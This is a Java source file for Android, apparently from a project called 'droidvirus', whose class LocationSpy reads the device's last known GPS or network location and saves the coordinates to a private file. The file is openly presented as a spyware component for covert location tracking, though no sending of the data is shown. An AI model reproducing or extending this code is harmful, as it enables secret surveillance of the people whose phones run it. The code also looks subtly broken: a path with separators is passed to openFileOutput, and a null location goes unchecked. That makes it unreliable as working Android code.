package com.artisanter.droidvirus;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import java.io.IOException;
import java.io.OutputStreamWriter;

public class LocationSpy {
    static Location getLastLocation(Context context) {
        LocationManager lManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

        assert lManager != null;
        Location locationGPS = lManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        Location locationNet = lManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        long GPSLocationTime = 0;
        if (null != locationGPS) { GPSLocationTime = locationGPS.getTime(); }

        long NetLocationTime = 0;
        if (null != locationNet) { NetLocationTime = locationNet.getTime(); }

        Location loc;
        if ( 0 < GPSLocationTime - NetLocationTime ) {
            loc = locationGPS;
        } else {
            loc = locationNet;
        }

        return loc;
    }

    static void writeLocation(Context context){
        Location loc = getLastLocation(context);
        String locationFile = context.getApplicationInfo().dataDir + "/location";

        try {
            OutputStreamWriter outputStreamWriter =
                    new OutputStreamWriter(context.openFileOutput(locationFile, Context.MODE_PRIVATE));
            outputStreamWriter.write(loc.getLatitude() + " " + loc.getLongitude());
            outputStreamWriter.close();
        }
        catch (IOException e) {}
    }
}
